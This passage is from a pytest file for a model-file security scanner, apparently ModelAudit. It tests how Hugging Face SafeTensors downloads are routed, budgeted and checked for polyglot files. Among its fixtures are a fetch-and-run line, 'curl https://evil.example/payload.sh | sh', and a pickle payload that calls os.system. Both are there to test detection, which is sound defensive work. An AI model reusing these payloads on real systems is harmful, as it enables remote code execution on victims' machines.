            (pickle.dumps({"benign": "pickle"}, protocol=4), False),
        ],
        ids=["malicious", "benign"],
    )
    def test_download_model_streaming_routes_renamed_pickle_before_header_scan(
        self,
        payload: bytes,
        expect_system_issue: bool,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A SafeTensors suffix must not bypass content-first pickle routing."""
        filename = "model.safetensors"
        model_path = tmp_path / filename
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(payload)}, _HF_TEST_REVISION),
        )

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            model_path.write_bytes(payload)
            return str(model_path)

        with (
            patch("requests.get", side_effect=_fake_range_responder(payload)),
            patch("huggingface_hub.hf_hub_download", side_effect=download_side_effect) as mock_download,
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=AssertionError("renamed pickle must use normal routing"),
            ) as mock_header_scan,
        ):
            result = scan_model_streaming(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"pickle", "safetensors"},
                    _include_scan_results=True,
                ),
                timeout=30,
                delete_after_scan=False,
                cache_enabled=False,
                scanners=["pickle", "safetensors"],
                skip_file_types=False,
            )

        assert determine_exit_code(result) == 1
        if expect_system_issue:
            assert any("system" in issue.message.lower() for issue in result.issues)
        else:
            assert not any("system" in issue.message.lower() for issue in result.issues)
            assert any("file type validation failed" in issue.message.lower() for issue in result.issues)
        mock_download.assert_called_once()
        mock_header_scan.assert_not_called()

    @pytest.mark.parametrize(
        ("budget_adjustment", "expected_success"),
        [(0, True), (-1, False)],
        ids=["conservative-budget", "one-byte-under"],
    )
    def test_download_model_streaming_falls_back_for_unknown_safetensors_content(
        self,
        budget_adjustment: int,
        expected_success: bool,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unknown SafeTensors-suffixed content reserves its probe and full download."""
        filename = "model.safetensors"
        payload = b"ordinary unknown model bytes"
        model_path = tmp_path / filename
        max_size = (2 * len(payload)) + 8 + budget_adjustment
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(payload)}, _HF_TEST_REVISION),
        )

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            model_path.write_bytes(payload)
            return str(model_path)

        with (
            patch("requests.get", side_effect=_fake_range_responder(payload)) as mock_requests_get,
            patch("huggingface_hub.hf_hub_download", side_effect=download_side_effect) as mock_download,
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=AssertionError("unknown content must not enter header-only mode"),
            ) as mock_header_scan,
        ):
            if expected_success:
                results = list(
                    download_model_streaming(
                        f"hf://test/model?revision={_HF_TEST_REVISION}",
                        max_size=max_size,
                        scannable_extensions={".safetensors"},
                        scannable_scanner_ids={"pickle", "safetensors"},
                        _include_scan_results=True,
                    )
                )
            else:
                with pytest.raises(Exception, match="minimum remote SafeTensors routing reads"):
                    list(
                        download_model_streaming(
                            f"hf://test/model?revision={_HF_TEST_REVISION}",
                            max_size=max_size,
                            scannable_extensions={".safetensors"},
                            scannable_scanner_ids={"pickle", "safetensors"},
                            _include_scan_results=True,
                        )
                    )
                results = []

        assert [(item[0], item[1]) for item in map(_unpack_internal_stream_item, results)] == (
            [(model_path, True)] if expected_success else []
        )
        assert mock_requests_get.call_count == int(expected_success)
        assert mock_download.call_count == int(expected_success)
        mock_header_scan.assert_not_called()

    def test_download_model_streaming_content_probe_transport_failure_is_fail_closed(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A failed content-validation transport must not fall through to either scan path."""
        import requests

        filename = "model.safetensors"
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: 128}, _HF_TEST_REVISION),
        )

        with (
            patch("requests.get", side_effect=requests.ConnectionError("probe unavailable")),
            patch("huggingface_hub.hf_hub_download") as mock_download,
            patch("modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header") as mock_header,
            pytest.raises(Exception, match="unable to inspect skipped file"),
        ):
            list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"pickle", "safetensors"},
                    _include_scan_results=True,
                )
            )

        mock_download.assert_not_called()
        mock_header.assert_not_called()

    @pytest.mark.parametrize(
        "payload",
        [
            _make_padded_safetensors_frame(
                0x5A4D,
                "llamafile runtime\nbash -c curl https://evil.example/payload.sh | sh",
            ),
            _make_padded_safetensors_frame(0x2078, "preset-dictionary zlib overlap"),
        ],
        ids=["llamafile", "zlib-preset-dictionary"],
    )
    def test_download_model_streaming_routes_structural_safetensors_overlaps_before_header_scan(
        self,
        payload: bytes,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Canonical content routing must retain structural non-SafeTensors owners."""
        filename = "model.safetensors"
        model_path = tmp_path / filename
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(payload)}, _HF_TEST_REVISION),
        )

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            model_path.write_bytes(payload)
            return str(model_path)

        with (
            patch("requests.get", side_effect=_fake_range_responder(payload)),
            patch("huggingface_hub.hf_hub_download", side_effect=download_side_effect) as mock_download,
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=AssertionError("structural overlap must use normal routing"),
            ) as mock_header_scan,
        ):
            results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"compressed", "llamafile", "safetensors"},
                    _include_scan_results=True,
                )
            )

        assert [(item[0], item[1]) for item in map(_unpack_internal_stream_item, results)] == [(model_path, True)]
        mock_download.assert_called_once()
        mock_header_scan.assert_not_called()

    @pytest.mark.parametrize(
        "payload",
        [
            _make_padded_safetensors_frame(0x5A4D, "llama-file runtime near match"),
            _make_padded_safetensors_frame(0x9C78, "decoder-invalid zlib header collision"),
        ],
        ids=["llamafile-marker-near-match", "zlib-decoder-invalid"],
    )
    def test_download_model_streaming_keeps_benign_safetensors_overlap_near_matches_header_only(
        self,
        payload: bytes,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Magic-like prefixes without structural overlap remain SafeTensors-owned."""
        filename = "model.safetensors"
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(payload)}, _HF_TEST_REVISION),
        )

        with (
            patch("requests.get", side_effect=_fake_range_responder(payload)),
            patch("huggingface_hub.hf_hub_download") as mock_download,
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=lambda _repo_id, scanned_filename, _revision, **_kwargs: _fake_remote_safetensors_scan(
                    scanned_filename, len(payload)
                ),
            ) as mock_header_scan,
        ):
            results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"compressed", "llamafile", "safetensors"},
                    _include_scan_results=True,
                )
            )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.metadata["remote_header_only"] is True
        mock_header_scan.assert_called_once()
        mock_download.assert_not_called()

    @pytest.mark.parametrize(
        ("budget_adjustment", "expected_success", "expected_request_count"),
        [(0, True, 4), (-1, False, 0)],
        ids=["exact-budget", "one-byte-under"],
    )
    def test_download_model_streaming_accounts_content_probe_before_header_ranges(
        self,
        budget_adjustment: int,
        expected_success: bool,
        expected_request_count: int,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Dry-run and runtime apply the same probe-plus-header max-size boundary."""
        filename = "model.safetensors"
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        max_size = (2 * len(frame)) + 8 + budget_adjustment
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(frame)}, _HF_TEST_REVISION),
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(frame) - 1)
            return _strict_range_response(
                frame[start : end + 1],
                len(frame),
                start_offset=start,
                url=url,
            )

        with (
            patch("requests.get", side_effect=range_response) as mock_requests_get,
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            if expected_success:
                results = list(
                    download_model_streaming(
                        f"hf://test/model?revision={_HF_TEST_REVISION}",
                        max_size=max_size,
                        scannable_extensions={".safetensors"},
                        scannable_scanner_ids={"pickle", "safetensors"},
                        _include_scan_results=True,
                    )
                )
            else:
                with pytest.raises(Exception, match=f"require at least {(2 * len(frame)) + 8} bytes"):
                    list(
                        download_model_streaming(
                            f"hf://test/model?revision={_HF_TEST_REVISION}",
                            max_size=max_size,
                            scannable_extensions={".safetensors"},
                            scannable_scanner_ids={"pickle", "safetensors"},
                            _include_scan_results=True,
                        )
                    )
                results = []

        if expected_success:
            _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
            assert scan_result.success is True
        else:
            assert results == []
        assert mock_requests_get.call_count == expected_request_count
        mock_download.assert_not_called()

    def test_download_model_streaming_accounts_probe_with_mixed_selected_file(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A normal selected file shares the exact runtime budget with probe and header reads."""
        config_name = "config.json"
        filename = "model.safetensors"
        config_payload = b"{}\n"
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        max_size = len(config_payload) + (2 * len(frame)) + 8
        payload_sizes = {config_name: len(config_payload), filename: len(frame)}
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([config_name, filename], _HF_TEST_REVISION, None),
        )

        def get_path_sizes(
            _repo_id: str,
            filenames: list[str],
            **_kwargs: object,
        ) -> tuple[dict[str, int], str]:
            return {name: payload_sizes[name] for name in filenames}, _HF_TEST_REVISION

        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            get_path_sizes,
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(frame) - 1)
            return _strict_range_response(
                frame[start : end + 1],
                len(frame),
                start_offset=start,
                url=url,
            )

        config_path = tmp_path / config_name

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            assert filename == config_name
            config_path.write_bytes(config_payload)
            return str(config_path)

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download", side_effect=download_side_effect) as mock_download,
        ):
            results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    max_size=max_size,
                    scannable_extensions={".json", ".safetensors"},
                    scannable_scanner_ids={"pickle", "safetensors"},
                    _include_scan_results=True,
                )
            )

        config_result = _unpack_internal_stream_item(results[0])
        assert config_result[:2] == (config_path, False)
        _path, is_last, scan_result, _accounting = _unpack_internal_stream_item(results[1])
        assert is_last is True
        assert scan_result.success is True
        mock_download.assert_called_once()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={"Authorization": "Bearer hf_secret"})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_streams_safetensors_header_without_body_download(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """SafeTensors streaming should inspect bounded headers without hf_hub_download."""
        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        _mock_build_headers.side_effect = lambda *, token=None, headers=None: {
            "Authorization": "Bearer hf_secret",
            **(headers or {}),
        }
        mock_requests_get.side_effect = [
            _FakeRangeResponse(
                frame[:8],
                headers={
                    "Content-Range": f"bytes 0-7/{declared_size}",
                    "Content-Length": "8",
                    "ETag": '"stable"',
                },
                status_code=206,
            ),
            _FakeRangeResponse(
                frame[: 8 + header_len],
                headers={
                    "Content-Range": f"bytes 0-{7 + header_len}/{declared_size}",
                    "Content-Length": str(8 + header_len),
                    "ETag": '"stable"',
                },
                status_code=206,
            ),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        assert len(results) == 1
        path, is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert path == Path(filename)
        assert is_last is True
        assert scan_result.success is True
        assert scan_result.metadata["remote_declared_size"] == declared_size
        assert scan_result.metadata["remote_bytes_transferred"] == 16 + header_len
        assert scan_result.metadata["hf_revision"] == _HF_TEST_REVISION
        assert scan_result.metadata["tensor_payload_bytes_downloaded"] == 0
        assert "remote_overlap_scanner_ids" not in scan_result.metadata
        assert scan_result.metadata["remote_shard_family"]["complete"] is True
        assert all(
            not str(check.location).startswith("/tmp/modelaudit_hf_safetensors")
            for check in scan_result.checks
            if check.location
        )
        assert "modelaudit_hf_safetensors" not in json.dumps(
            [check.details for check in scan_result.checks],
            default=str,
        )
        assert any(check.location == f"hf://test/model@{_HF_TEST_REVISION}/{filename}" for check in scan_result.checks)
        mock_hf_hub_download.assert_not_called()
        assert [call.kwargs["headers"]["Range"] for call in mock_requests_get.call_args_list] == [
            "bytes=0-7",
            f"bytes=0-{7 + header_len}",
        ]

    @pytest.mark.parametrize("filename", ["weights." + ("x" * 241), "weights.invalid:name?*"])
    def test_remote_safetensors_uses_private_temp_suffix_for_untrusted_filename(
        self,
        filename: str,
    ) -> None:
        """Remote names must not control the platform-specific temporary suffix."""
        import tempfile as stdlib_tempfile

        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        with (
            patch("huggingface_hub.utils.build_hf_headers", return_value={}),
            patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/file"),
            patch(
                "requests.get",
                side_effect=[
                    _strict_range_response(frame[:8], len(frame)),
                    _strict_range_response(frame[: 8 + header_len], len(frame)),
                ],
            ),
            patch(
                "modelaudit.utils.sources.huggingface.tempfile.NamedTemporaryFile",
                wraps=stdlib_tempfile.NamedTemporaryFile,
            ) as mock_named_temp,
        ):
            result = _scan_remote_huggingface_safetensors_header(
                "test/model",
                filename,
                _HF_TEST_REVISION,
                declared_size=len(frame),
                deadline=None,
                active_scanner_ids={"safetensors"},
            )

        assert result.success is True
        mock_named_temp.assert_called_once()
        assert mock_named_temp.call_args.kwargs["suffix"] == ".safetensors"

    @pytest.mark.parametrize("complete", [False, True], ids=["missing", "complete"])
    def test_download_model_streaming_reconciles_custom_stem_shard_family(
        self,
        complete: bool,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        first = "adapter_model-00001-of-00002.safetensors"
        second = "adapter_model-00002-of-00002.safetensors"
        repo_files = [first, second] if complete else [first]
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (repo_files, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (dict.fromkeys(repo_files, len(frame)), _HF_TEST_REVISION),
        )

        responses = []
        for _filename in repo_files:
            responses.extend(
                [
                    _strict_range_response(frame[:8], len(frame)),
                    _strict_range_response(frame[: 8 + header_len], len(frame)),
                ]
            )
        with (
            patch("huggingface_hub.utils.build_hf_headers", return_value={}),
            patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/file"),
            patch("requests.get", side_effect=responses),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            streamed = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    max_size=4096,
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
            )

        for item in streamed:
            _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(item)
            family = scan_result.metadata["remote_shard_family"]
            assert family["complete"] is complete
            assert family["missing_shard_indices"] == ([] if complete else [2])
        aggregate = scan_model_streaming(
            iter(streamed),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["safetensors"],
            skip_file_types=False,
        )
        assert aggregate.success is complete
        assert determine_exit_code(aggregate) == (0 if complete else 2)
        mock_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_preserves_safetensors_header_limit_config(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Remote header streaming must honor caller SafeTensors scanner limits."""
        filename = "model-00001-of-00001.safetensors"
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.return_value = _strict_range_response(frame[:8], declared_size)

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                scanner_config={"max_safetensors_header_bytes": 16},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is False
        assert scan_result.metadata["remote_bytes_transferred"] == 8
        assert "safetensors_header_size_limit_exceeded" in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    @pytest.mark.parametrize(
        ("header_prefix", "overlap_scanner_id"),
        [
            (b"T7\x00\x00\x00\x00\x00\x00", "torch7"),
            (b"\x1f\x8b\x00\x00\x00\x00\x00\x00", "compressed"),
        ],
        ids=["torch7-magic", "invalid-gzip-magic"],
    )
    def test_download_model_streaming_ignores_safetensors_header_length_overlap_near_match(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
        header_prefix: bytes,
        overlap_scanner_id: str,
    ) -> None:
        """SafeTensors length bytes alone must not activate foreign payload scanners."""
        filename = "model-00001-of-00001.safetensors"
        header_len = struct.unpack("<Q", header_prefix)[0]
        header = json.dumps(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            separators=(",", ":"),
        ).encode("utf-8")
        frame = header_prefix + header + (b" " * (header_len - len(header))) + (b"\x00" * 4)
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame[:_HF_CONTENT_SNIFF_BYTES], declared_size),
            _strict_range_response(frame[: 8 + header_len], declared_size),
            _strict_range_response(frame[:8], declared_size),
            _strict_range_response(frame[: 8 + header_len], declared_size),
            _strict_range_response(frame[8 + header_len :], declared_size, start_offset=8 + header_len),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=_HF_CONTENT_SNIFF_BYTES + (2 * header_len) + 28,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors", overlap_scanner_id},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is True
        assert "remote_safetensors_overlap_coverage_incomplete" not in scan_result.metadata.get(
            "scan_outcome_reasons", []
        )
        assert "remote_overlap_scanner_ids" not in scan_result.metadata
        assert scan_result.metadata["tensor_payload_bytes_downloaded"] == 4
        assert mock_requests_get.call_count == 5
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    @pytest.mark.parametrize(
        ("overlap_scanner_id", "tensor_data"),
        [
            ("torch7", b"T7\x00\x00torch.nn.Tensor"),
            ("compressed", gzip.compress(b"overlap")),
        ],
        ids=["torch7", "gzip"],
    )
    def test_download_model_streaming_ignores_compression_like_tensor_payloads(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
        overlap_scanner_id: str,
        tensor_data: bytes,
    ) -> None:
        """Tensor bytes alone do not establish a whole-file compression or Torch7 route."""
        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [len(tensor_data)], "data_offsets": [0, len(tensor_data)]}},
            tensor_data,
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame, declared_size),
            _strict_range_response(frame[:8], declared_size),
            _strict_range_response(frame[: 8 + header_len], declared_size),
            _strict_range_response(frame[8 + header_len :], declared_size, start_offset=8 + header_len),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors", overlap_scanner_id},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is True
        assert "remote_overlap_scanner_ids" not in scan_result.metadata
        assert "remote_safetensors_overlap_coverage_incomplete" not in scan_result.metadata.get(
            "scan_outcome_reasons", []
        )
        assert mock_requests_get.call_count == 4
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_fails_closed_for_safetensors_pickle_polyglot(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Remote header mode must preserve the local SafeTensors/pickle overlap route."""
        filename = "model.safetensors"
        pickle_tail = b"\n0cos\nsystem\n(Vecho modelaudit-polyglot\ntR."
        header_len = ord("V")
        header = json.dumps(
            {"tensor": {"dtype": "U8", "shape": [len(pickle_tail)], "data_offsets": [0, len(pickle_tail)]}},
            separators=(",", ":"),
        ).encode("utf-8")
        assert len(header) <= header_len
        frame = struct.pack("<Q", header_len) + header + (b" " * (header_len - len(header))) + pickle_tail
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame, declared_size),
            _strict_range_response(frame[:8], declared_size),
            _strict_range_response(frame[: 8 + header_len], declared_size),
            _strict_range_response(frame[8 + header_len :], declared_size, start_offset=8 + header_len),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_scanner_ids={"safetensors", "pickle"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is False
        assert scan_result.metadata["remote_overlap_scanner_ids"] == ["pickle"]
        assert "remote_safetensors_overlap_coverage_incomplete" in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == 4
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_ignores_zip_magic_only_payload_near_match(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """ZIP magic without a valid central directory must not fail a SafeTensors scan."""
        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"PK\x03\x04",
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame, declared_size),
            _strict_range_response(frame[:8], declared_size),
            _strict_range_response(frame[: 8 + header_len], declared_size),
            _strict_range_response(frame[8 + header_len :], declared_size, start_offset=8 + header_len),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors", "zip"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is True
        assert "remote_safetensors_overlap_coverage_incomplete" not in scan_result.metadata.get(
            "scan_outcome_reasons", []
        )
        assert "remote_overlap_scanner_ids" not in scan_result.metadata
        assert scan_result.metadata["tensor_payload_bytes_downloaded"] == 4
        assert mock_requests_get.call_count == 4
        mock_hf_hub_download.assert_not_called()

